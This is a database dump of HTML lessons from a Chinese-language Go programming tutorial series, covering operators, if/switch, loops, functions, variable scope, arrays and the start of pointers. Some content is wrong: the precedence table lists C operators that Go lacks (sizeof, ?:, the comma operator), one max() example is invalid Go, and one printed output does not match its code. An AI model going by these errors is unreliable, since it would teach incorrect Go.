~ ++ - - (type)* &amp; sizeof&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从右到左</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">乘法</td>\r\n			<td style=\"vertical-align:top\">* / %&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">相加 &nbsp;</td>\r\n			<td style=\"vertical-align:top\">+ -&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右&nbsp;</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">移动</td>\r\n			<td style=\"vertical-align:top\">&lt;&lt; &gt;&gt;&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">关系</td>\r\n			<td style=\"vertical-align:top\">&lt; &lt;= &gt; &gt;=&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">相等</td>\r\n			<td style=\"vertical-align:top\">== !=&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">按位与</td>\r\n			<td style=\"vertical-align:top\">&amp;&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">按位异或</td>\r\n			<td style=\"vertical-align:top\">^&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">按位或&nbsp;</td>\r\n			<td style=\"vertical-align:top\">|&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">逻辑与&nbsp;</td>\r\n			<td style=\"vertical-align:top\">&amp;&amp;&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">逻辑或&nbsp;</td>\r\n			<td style=\"vertical-align:top\">||&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">条件&nbsp;</td>\r\n			<td style=\"vertical-align:top\">?:&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">赋值</td>\r\n			<td style=\"vertical-align:top\">= += -= *= /= %=&gt;&gt;= &lt;&lt;= &amp;= ^= |=&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从右到左</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">逗号&nbsp;</td>\r\n			<td style=\"vertical-align:top\">,&nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右<br />\r\n			&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n',0,0,'go语言系列教程8-运算符',63,NULL,0),(38,0,'20150617092547',1,'<p>决策结构需要程序员指定一个或多个条件进行评估计算，或由程序进行测试，如果条件被确定为真那么一条或多条语句被执行，如果条件被执行被确定为假那么其它语句块被执行。</p>\r\n\r\n<p>以下是在大多数编程语言中的典型决策结构的一般形式：</p>\r\n\r\n<p><img alt=\"Decision making statements in Go\" src=\"http://www.yiibai.com/uploads/allimg/150305/0H03213b-0.jpg\" style=\"border:0px; box-sizing:border-box; color:rgb(49, 49, 49); display:block; font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-left:auto; margin-right:auto; max-width:100%; padding-bottom:4px; vertical-align:middle\" /></p>\r\n\r\n<p>Go编程语言提供以下几种类型的决策语句。点击以下链接查看其详细信息。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:211px\">语句</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">if 语句</td>\r\n			<td style=\"vertical-align:top\">if语句包含一个布尔表达式以及后面跟一个或多个语句</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">if...else 语句</td>\r\n			<td style=\"vertical-align:top\">if语句可以跟着一个可选的else语句，布尔表达式是假时它被执行</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">if 语句</td>\r\n			<td style=\"vertical-align:top\">可以使用一个if或else if语句在另一个if或else if语句中</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">switch 语句</td>\r\n			<td style=\"vertical-align:top\">switch语句可以让一个变量相等值的列表进行测试</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">select 语句</td>\r\n			<td style=\"vertical-align:top\">select语句是类似使用不同的switch语句的case语句指通道通信。<br />\r\n			&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n',0,0,'go语言系列教程9-决策（if）',52,NULL,0),(39,0,'20150617092640',1,'<p>可能有一种情况，当你需要执行的代码块多次。在一般情况下，语句顺序执行：在一个函数的第一条语句，首先执行，然后是第二个等等。</p>\r\n\r\n<p>编程语言提供了各种控制结构，允许更多复杂的执行路径。</p>\r\n\r\n<p>循环语句可以让我们执行语句或组多次，下面是在大多数编程语言循环语句的一般形式：</p>\r\n\r\n<p><img alt=\"Loop Architecture\" src=\"http://www.yiibai.com/uploads/allimg/150305/0ZJ9A29-0.jpg\" style=\"border:0px; box-sizing:border-box; color:rgb(49, 49, 49); display:block; font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-left:auto; margin-right:auto; max-width:100%; padding-bottom:4px; vertical-align:middle\" /></p>\r\n\r\n<p>Go编程语言提供以下循环类型的处理循环需求。点击以下链接查看其详细信息。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:180px\">循环类型</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">for循环</td>\r\n			<td style=\"vertical-align:top\">执行的语句多次的序列和简写管理循环变量的代码</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">嵌套循环</td>\r\n			<td style=\"vertical-align:top\">可以使用一个或多个for循环在其它for循环中</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>循环控制语句：</p>\r\n\r\n<p>循环控制语句改变其正常的顺序执行。当执行离开范围后，在该范围内创建的所有自动对象被销毁。</p>\r\n\r\n<p>Go语言支持下列控制语句。点击以下链接查看其详细信息。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:180px\">控制语句</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">break语句</td>\r\n			<td style=\"vertical-align:top\">终止循环或switch语句并将执行的语句紧随其后的循环或switch</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">continue语句</td>\r\n			<td style=\"vertical-align:top\">导致循环跳过主体的其余部分，并立即重新测试其使用条件</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">goto语句</td>\r\n			<td style=\"vertical-align:top\">控制权转移给标签的语句</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>无限循环：</p>\r\n\r\n<p>一个循环变得无限循环，如果条件永远不会为假。 for循环是传统上用于此目的。由于没有形成for循环是必需的三个表达式中，可以通过离开条件，使用空表达式或传递true给它形成一个死循环。</p>\r\n\r\n<pre>\r\npackage main\r\n\r\nimport &quot;fmt&quot;\r\n\r\nfunc main() {\r\n   for true  {\r\n       fmt.Printf(&quot;This loop will run forever.\\n&quot;);\r\n   }\r\n}\r\n</pre>\r\n\r\n<p>当条件表达式为不存在，它被假定为真。你可能有一个初始化和增量的表达，但C程序员更普遍使用for（;;）结构来表示一个无限循环。</p>\r\n\r\n<p>注意：您可以通过按Ctrl+ C键终止无限循环。</p>\r\n',0,0,'go语言系列教程10-循环(for)',66,NULL,0),(40,0,'20150617092930',1,'<p>函数是一组一起执行任务的语句。每Go程序具有至少一个函数，它一般是main()，以及所有的最琐碎程序可以定义附加函数。</p>\r\n\r\n<p>你可以将代码放到独立的功能。如何划分代码之间的不同功能，但逻辑上的划分通常是让每个函数执行特定的任务。</p>\r\n\r\n<p>函数声明告诉编译器有关的函数的名称，返回类型和参数。一个函数定义提供了函数的实际主体。</p>\r\n\r\n<p>Go语言标准库提供了大量的内置函数，在程序可以调用。例如，函数len()需要不同类型的参数和返回值的类型的长度。例如，如果一个字符串传递给它，它会返回字符串的长度以字节为单位，如果一个数组传递给它，它就会返回数组的长度为它所拥有元素的个数。</p>\r\n\r\n<p>函数称为具有各种名字等的方法或子例程或程序等。</p>\r\n\r\n<p>定义一个函数：</p>\r\n\r\n<p>在Go编程语言的函数定义的一般形式如下：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">func function_name( [parameter list] ) [return_types]\r\n{\r\n   body of the function\r\n}</code></pre>\r\n\r\n<p>在Go编程语言中的函数定义由函数头和函数体。这里是一个函数的所有部分：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>func&nbsp;</strong>开始函数的声明。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Function Name:&nbsp;</strong>这是该函数的实际名称。函数名和参数列表一起构成了函数签名。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Parameters:&nbsp;</strong>参数是像一个占位符。当调用一个函数，你传递一个值的参数。这个值被称为实际参数或参数。参数列表指的类型，顺序和数量的函数的参数。参数是可选的;也就是说，一个函数可包含任何参数。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Return Type:</strong>&nbsp;函数可能返回值的列表。return_types是该函数返回值的数据类型的列表。有些函数执行所需的操作没有返回值。在这种情况下，return_type不是必需的。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Function Body:</strong>&nbsp;函数体包含了定义函数操作语句的集合。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>例子：</p>\r\n\r\n<p>下面是一个函数的源代码称为max()。这个函数有两个参数num1与num2并返回两者之间的最大值：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">/* function returning the max between two numbers */\r\nfunc max(num1, num2 int) int\r\n{\r\n   /* local variable declaration */\r\n   result int\r\n\r\n   if (num1 &gt; num2) {\r\n      result = num1\r\n   } else {\r\n      result = num2\r\n   }\r\n   return result \r\n}</code></pre>\r\n\r\n<p>调用一个函数：</p>\r\n\r\n<p>创建一个Go编程的函数必须做一个定义。要使用函数，需要调用该函数来执行规定的任务。</p>\r\n\r\n<p>当程序调用函数，程序控制被转移到所调用的函数。调用函数定义执行任务时，被执行的return语句或达到其功能结束的右括号，则返回程序控制返回到主程序。</p>\r\n\r\n<p>要调用一个函数，只需要通过必要的参数以及函数的名称，如果函数返回一个值，那么可以存储返回值。例如：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   /* local variable definition */\r\n   var a int = 100\r\n   var b int = 200\r\n   var ret int\r\n\r\n   /* calling a function to get max value */\r\n   ret = max(a, b)\r\n\r\n   fmt.Printf( \"Max value is : %d\\n\", ret )\r\n}\r\n\r\n/* function returning the max between two numbers */\r\nfunc max(num1, num2 int) int {\r\n   /* local variable declaration */\r\n   var result int\r\n\r\n   if (num1 &gt; num2) {\r\n      result = num1\r\n   } else {\r\n      result = num2\r\n   }\r\n   return result \r\n}</code></pre>\r\n\r\n<p>保持max()函数与main()函数并编译源代码。在运行最后的可执行文件，它会产生如下结果：</p>\r\n\r\n<pre>\r\nMax value is : 200\r\n</pre>\r\n\r\n<p>从函数返回多个值</p>\r\n\r\n<p>Go语言函数可以返回多个值。例如：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc swap(x, y string) (string, string) {\r\n   return y, x\r\n}\r\n\r\nfunc main() {\r\n   a, b := swap(\"Mahesh\", \"Kumar\")\r\n   fmt.Println(a, b)\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nKumar Mahesh\r\n</pre>\r\n\r\n<p>函数参数：</p>\r\n\r\n<p>如果一个函数使用参数，它必须声明接受的参数值的变量。这些变量被调用的函数的形式参数。</p>\r\n\r\n<p>正式的参数表现得就像在函数内部其他本地变量并且在进入函数创建和退出时销毁。</p>\r\n\r\n<p>当调用一个函数，有一些参数可以传递给函数，有两种方法：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:180px\">调用类型</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">按值调用</td>\r\n			<td style=\"vertical-align:top\">这种方法复制一个参数的实际值到函数的形式参数。在这种情况下，参数在函数内变化对参数没有影响</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">参考调用</td>\r\n			<td style=\"vertical-align:top\">这种方法复制一个参数的地址复制到形式参数。在函数里边，地址是用来访问调用中使用的实际参数。这意味着，对参数的更改会影响参数</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>默认情况下，Go使用按值调用传递参数。在一般情况下，这意味着一个函数中的代码不能改变用来调用该函数的参数和上面提到的例子，而调用max()函数中使用同样的方法。</p>\r\n\r\n<p>函数用途：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:180px\">函数用途</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">函数作为值</td>\r\n			<td style=\"vertical-align:top\">函数可以运行创建并且可以被用作值</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">闭包函数</td>\r\n			<td style=\"vertical-align:top\">函数闭合是匿名的函数，可以在动态编程中使用</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">方法</td>\r\n			<td style=\"vertical-align:top\">方法是用一个接收器的特殊功能</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'go语言系列教程11-函数(function)',67,NULL,0),(41,0,'20150617093322',1,'<p>在任何编程程序的作用域，其中一个定义的变量可以有它的存在，超出该变量的区域就不能访问。有三个地方变量可以在Go编程语言声明如下：</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>内部函数或这就是所谓的局部变量块</p>\r\n	</li>\r\n	<li>\r\n	<p>所有函数的外面的变量称为全局变量</p>\r\n	</li>\r\n	<li>\r\n	<p>在这被称为形式参数函数的参数的定义</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>让我们来解释一下什么是局部和全局变量和形式参数。</p>\r\n\r\n<p>局部变量</p>\r\n\r\n<p>这是一个函数或块内声明的变量称为局部变量。它们只能由属于该函数或代码块内部的语句中使用。局部变量是对在函数外部是不能使用的。下面是使用局部变量的例子。这里的变量a，b和c是main()函数的局部变量。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   /* local variable declaration */\r\n   var a, b, c int \r\n\r\n   /* actual initialization */\r\n   a = 10\r\n   b = 20\r\n   c = a + b\r\n\r\n   fmt.Printf (\"value of a = %d, b = %d and c = %d\\n\", a, b, c)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nvalue of a = 10, b = 20 and c = 30\r\n</pre>\r\n\r\n<p>全局变量</p>\r\n\r\n<p>全局变量函数的定义之外，通常在程序的顶部。全局变量的值在整个项目的生命周期，它们可以在里面任意的程序中定义的函数中访问。</p>\r\n\r\n<p>全局变量可以被任何函数访问。也就是说，全局变量可以在整个程序中使用在它声明之后。下面是使用全局和局部变量的例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n \r\n/* global variable declaration */\r\nvar g int\r\n \r\nfunc main() {\r\n\r\n   /* local variable declaration */\r\n   var a, b int\r\n\r\n   /* actual initialization */\r\n   a = 10\r\n   b = 20\r\n   g = a + b\r\n\r\n   fmt.Printf(\"value of a = %d, b = %d and g = %d\\n\", a, b, g)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nvalue of a = 10, b = 20 and c = 30\r\n</pre>\r\n\r\n<p>程序的局部和全局变量可以使用相同的名称，但局部变量的值在函数内部优先。下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n \r\n/* global variable declaration */\r\nvar g int = 20\r\n \r\nfunc main() {\r\n   /* local variable declaration */\r\n   var g int = 10\r\n \r\n   fmt.Printf (\"value of g = %d\\n\",  g)\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nvalue of g = 10\r\n</pre>\r\n\r\n<p>形式参数</p>\r\n\r\n<p>函数的参数，形式参数，被视为与-局部变量函数，它们将优先于全局变量。下面是一个例子：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n \r\n/* global variable declaration */\r\nvar a int = 20;\r\n \r\nfunc main() {\r\n   /* local variable declaration in main function */\r\n   var a int = 10\r\n   var b int = 20\r\n   var c int = 0\r\n\r\n   fmt.Printf(\"value of a in main() = %d\\n\",  a);\r\n   c = sum( a, b);\r\n   fmt.Printf(\"value of c in main() = %d\\n\",  c);\r\n}\r\n\r\n/* function to add two integers */\r\nfunc sum(a, b int) int {\r\n   fmt.Printf(\"value of a in sum() = %d\\n\",  a);\r\n   fmt.Printf(\"value of b in sum() = %d\\n\",  b);\r\n\r\n   return a + b;\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nvalue of a in main() = 10\r\nvalue of a in sum() = 10\r\nvalue of b in sum() = 20\r\nvalue of c in main() = 30\r\n</pre>\r\n\r\n<p>初始化局部和全局变量</p>\r\n\r\n<p>当局部变量作为全局变量被初始化其对应值为0。指针被初始化为nil。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:180px\">数据类型</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">最初的默认值</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">int</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">float32</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">pointer</td>\r\n			<td style=\"vertical-align:top\">nil</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'go语言系列教程12-范围规则',61,NULL,0),(42,0,'20150617093716',1,'<p>Go编程语言提供称为数组的数据结构，其可存储相同类型的元素的一个固定大小的连续集合。数组用于存储数据的集合，但它往往是更加有用认为数组作为相同类型的变量的集合。</p>\r\n\r\n<p>相反，声明单个变量，如number0, number1, ...和number99，声明一个数组变量，如号码和使用numbers[0], numbers[1]...numbers[99]表示单个变量。在数组的特定元素是由一个索引进行访问。</p>\r\n\r\n<p>所有数组由连续的内存位置。最低的地址对应于第一元素和最高地址为最后一个元素。</p>\r\n\r\n<p><img alt=\"Arrays in Go\" src=\"http://www.yiibai.com/uploads/allimg/150306/154HMY0-0.jpg\" style=\"border:0px; box-sizing:border-box; color:rgb(49, 49, 49); display:block; font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-left:auto; margin-right:auto; max-width:100%; padding-bottom:4px; vertical-align:middle\" /></p>\r\n\r\n<p>声明数组</p>\r\n\r\n<p>要声明在Go语言数组，程序员指定元素的类型以及如下的数组所需元件的数目：</p>\r\n\r\n<pre>\r\nvar variable_name [SIZE] variable_type\r\n</pre>\r\n\r\n<p>这就是所谓的一维数组。arraySize必须是一个非零整数常数,类型可以是任何有效的数据类型。例如，要声明一个10个元素的数组为balance，类型float32使用下面的语句：</p>\r\n\r\n<pre>\r\nvar balance [10] float32\r\n</pre>\r\n\r\n<p>现在balance是一个变量数组，其足以容纳10浮点数。</p>\r\n\r\n<p>初始化数组</p>\r\n\r\n<p>你可以用一个Go初始化数组一个或者使用单一的声明如下：</p>\r\n\r\n<pre>\r\nvar balance = [5]float32{1000.0, 2.0, 3.4, 7.0, 50.0}\r\n</pre>\r\n\r\n<p>括号之间的数{}的值不能比声明方括号[]之间的数组元素的数大。</p>\r\n\r\n<p>如果省略数组的大小，数组只是大足以容纳初始化被创建。因此，如果编写：</p>\r\n\r\n<pre>\r\nvar balance = []float32{1000.0, 2.0, 3.4, 7.0, 50.0}\r\n</pre>\r\n\r\n<p>将创建完全相同的数组，和前面的例子中那样。下面是一个例子，分配数组的单个元素：</p>\r\n\r\n<pre>\r\nbalance[4] = 50.0\r\n</pre>\r\n\r\n<p>以上语句用50.0的数值作为数组中的元素分配到第5个位置。所有数组通常0作为其第一元件的也被称为基本索引，数组的最后一个索引的索引将是数组的总大小减去1；以下是我们上面讨论的相同的数组的图形表示：</p>\r\n\r\n<p><img alt=\"Array Presentation\" src=\"http://www.yiibai.com/uploads/allimg/150306/154HI5O-1.jpg\" style=\"border:0px; box-sizing:border-box; color:rgb(49, 49, 49); display:block; font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-left:auto; margin-right:auto; max-width:100%; padding-bottom:4px; vertical-align:middle\" /></p>\r\n\r\n<p>访问数组元素</p>\r\n\r\n<p>元素由索引数组名访问。这是由放置在方括号内的元素的索引数组的名称后进行。例如：</p>\r\n\r\n<pre>\r\nfloat32 salary = balance[9]\r\n</pre>\r\n\r\n<p>以上语句需要将数组的第10个位置的元素赋值给变量salary。以下是其将使用所有上述三个概念即一个例子。声明，分配和访问数组：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var n [10]int /* n is an array of 10 integers */\r\n   var i,j int\r\n\r\n   /* initialize elements of array n to 0 */         \r\n   for i = 0; i &lt; 10; i++ {\r\n      n[i] = i + 100 /* set element at location i to i + 100 */\r\n   }\r\n\r\n   /* output each array element\'s value */\r\n   for j = 0; j &lt; 10; j++ {\r\n      fmt.Printf(\"Element[%d] = %d\\n\", j, n[j] )\r\n   }\r\n}</code></pre>\r\n\r\n<p style=\"text-align:justify\">让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nElement[0] = 100\r\nElement[1] = 101\r\nElement[2] = 102\r\nElement[3] = 103\r\nElement[4] = 104\r\nElement[5] = 105\r\nElement[6] = 106\r\nElement[7] = 107\r\nElement[8] = 108\r\nElement[9] = 109\r\n</pre>\r\n\r\n<p>Go语言数组详情</p>\r\n\r\n<p>数组是很重要的在Go语言中，应该需要了解更多的细节。有下列关系到数组几个重要的概念Go程序员是应该清楚的：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:180px\">概念</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">多维数组</td>\r\n			<td style=\"vertical-align:top\">Go支持多维数组。多维数组的最简单的形式是二维数组</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">通过数组传递给函数</td>\r\n			<td style=\"vertical-align:top\">可以通过指定数组的名称不使用索引传递给函数的指针数组</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'Go语言系列教程13-数组',65,NULL,0),(43,0,'20150617094509',1,'<p>在Go中指针是很容易学习的。一些进入编程任务，指针更容易操作，如通过引用调用，需要要使用指针来执行。所以学习指针成为完美Go程序员很有必要。让我们开始学习指针的简单和容易的步骤。</p>\r\n\r\n<p>如你所知，每一个变量是一个内存位置，每个存储单元都有其定义的地址，可以用符号(＆)运算符，它表示一个内存地址进行访问。考虑下面的例子，这将打印中定义的变量的地址。</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var a int = 10   \r\n\r\n   fmt.Printf(\"Address of a variable: %x\\n\", &amp;a  )\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它会产生导致一些如下：</p>\r\n\r\n<pre>\r\nAddress of a variable: 10328000\r\n</pre>\r\n\r\n<p>所以，明白了什么是内存地址以及如何访问它，所以这个概念的基础上。现在，让我们来看看什么是指针。</p>\r\n\r\n<p>什么是指针？</p>\r\n\r\n<p>指针是一个变量，其值是另一个变量的地址，所述存储器位置，即，直接地址。就像变量或常量，必须声明指针之前，可以用它来存储任何变量的地址。指针变量声明的一般形式是：</p>\r\n\r\n<pre>\r\nvar var_name *var-type\r\n</pre>\r\n\r\n<p>在这里，<strong>type</strong>为指针的基本类型;它必须是一个有效的Go数据类型，<strong>var-name</strong>是指针变量的名称。 * 用来声明指针使用星号。然而，在该语句中的星号被用来指定一个变量作为一个指针。以下是有效的指针声明：</p>\r\n\r\n<pre>\r\nvar ip *int        /* pointer to an integer */\r\nvar fp *float32    /* pointer to a float */\r\n</pre>\r\n\r\n<p>所有指针值的实际数据类型，无论是整数，浮点或以其他方式，都是相同的，代表一存储器地址的长十六进制数。不同数据类型的指针之间的唯一区别是变量的数据类型或常数，由该指针指向。</p>\r\n\r\n<p>如何使用指针？</p>\r\n\r\n<p>有一些重要的操作，我们使用指针非常频繁。 